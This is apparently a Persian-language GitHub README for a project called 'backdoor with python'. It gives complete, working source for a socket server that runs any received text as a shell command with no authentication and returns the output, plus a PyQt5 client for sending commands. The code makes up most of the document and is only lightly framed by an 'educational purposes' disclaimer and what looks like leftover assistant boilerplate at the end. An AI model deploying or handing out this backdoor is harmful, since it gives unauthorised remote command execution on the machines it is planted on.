م

---

# بک دور با پایتون

این پروژه شامل دو قسمت اصلی است: یک سرور که برای اتصال‌های ورودی گوش می‌دهد و دستورات دریافتی را اجرا می‌کند، و یک کلاینت با رابط کاربری PyQt5 که به سرور متصل شده و دستورات را برای اجرا ارسال می‌کند. همچنین کلاینت خروجی دستورات اجرا شده را نمایش می‌دهد.

## امکانات

- اجرای دستورات از راه دور از طریق یک رابط کاربری ساده و کاربرپسند با PyQt5
- نمایش لحظه‌ای خروجی دستورات در برنامه کلاینت
- رابط کاربری آسان برای استفاده با ورودی متن برای دستورات و ناحیه نمایش برای نتایج
- سرور به درخواست‌های چندین کلاینت گوش می‌دهد و آن‌ها را مدیریت می‌کند

## نصب

### پیش نیازها

- Python 3.x
- PyQt5
- تنظیمات شبکه‌ای که ارتباط بین کلاینت و سرور را فراهم کند

### نصب PyQt5

شما می‌توانید PyQt5 را با استفاده از pip نصب کنید:

```bash
pip install PyQt5
```

## استفاده

### اجرای سرور

سرور به اتصال‌های ورودی بر روی هاست و پورت مشخص گوش می‌دهد. دستورات دریافتی را اجرا کرده و خروجی را به کلاینت ارسال می‌کند.

برای اجرای سرور، از دستور زیر استفاده کنید:

```bash
python server.py
```

**کد سرور:**

```python
import subprocess
import socket

def main():
    host = '192.168.0.4'
    port = 999
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(f"Listening on port {port}...")
    while True:
        conn, addr = s.accept()
        print(f"Connected to client: {addr[0]}:{addr[1]}")
        
        while True:
            try:
                command = conn.recv(1024).decode().strip()
                if not command:
                    break

                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = proc.communicate()

                conn.sendall(output)
                conn.sendall(error)
            except Exception as e:
                conn.sendall(str(e).encode())

        conn.close()

if __name__ == "__main__":
    main()
```

### اجرای کلاینت

کلاینت به سرور متصل شده و یک رابط کاربری گرافیکی برای ارسال دستورات و نمایش نتایج ارائه می‌دهد.

برای اجرای کلاینت، از دستور زیر استفاده کنید:

```bash
python client.py
```

**کد کلاینت:**

```python
import sys
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QLineEdit, QPushButton, QTextEdit, QMessageBox
from PyQt5.QtCore import QThread, pyqtSignal
import socket

class ClientThread(QThread):
    output_signal = pyqtSignal(str)

    def __init__(self, host, port, command_input, parent=None):
        super().__init__(parent)
        self.host = host
        self.port = port
        self.command_input = command_input

    def run(self):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((self.host, self.port))
        self.output_signal.emit("vasl shod !\n")
        
        while True:
            command = self.command_input.text()
            self.conn.send(command.encode())
            output_data = self.conn.recv(1024).decode()
            self.output_signal.emit(output_data)

class RemoteCommandExecutor(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Remote Command Executor")

        layout = QVBoxLayout()

        self.output_display = QTextEdit()
        self.output_display.setReadOnly(True)
        layout.addWidget(self.output_display)

        self.command_input = QLineEdit()
        layout.addWidget(self.command_input)

        self.send_button = QPushButton("Send Command")
        self.send_button.clicked.connect(self.send_command)
        layout.addWidget(self.send_button)

        self.setLayout(layout)

        self.host = '192.168.0.4'
        self.port = 999
        self.client_thread = ClientThread(self.host, self.port, self.command_input)
        self.client_thread.output_signal.connect(self.update_output)
        self.client_thread.start()

    def send_command(self):
        command = self.command_input.text()
        self.client_thread.conn.send(command.encode())
        self.command_input.clear()

    def update_output(self, output):
        self.output_display.append(output)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = RemoteCommandExecutor()
    window.show()
    sys.exit(app.exec_())
```

## تصاویر

![رابط کاربری کلاینت](![1717540374372](https://github.com/msade6h/backdoor-with-python/assets/94873023/5c644a55-01b0-4d57-bc3a-3ee5d0cc9a1a)
)
*تصویری از رابط کاربری کلاینت برای اجرای دستورات از راه دور.*

## مشارکت

1. ریپازیتوری را فورک کنید.
2. یک شاخه جدید ایجاد کنید (`git checkout -b feature-branch`).
3. تغییرات خود را کامیت کنید (`git commit -am 'Add new feature'`).
4. به شاخه خود پوش کنید (`git push origin feature-branch`).
5. یک Pull Request جدید ایجاد کنید.

## مجوز

این پروژه تحت مجوز MIT منتشر شده است - برای جزئیات بیشتر فایل [LICENSE](LICENSE) را ببینید.

## اعلان

این پروژه فقط برای مقاصد آموزشی است. لطفاً از آن به صورت مسئولانه و اخلاقی استفاده کنید.

---

این نمونه README شامل تمام جزئیات لازم برای توضیح پروژه شما، نصب و اجرای آن و همچنین برخی جزئیات اضافی است که ممکن است برای کاربران مفید باشد. شما می‌توانید این فایل را به دلخواه خود تغییر داده و سفارشی کنید.
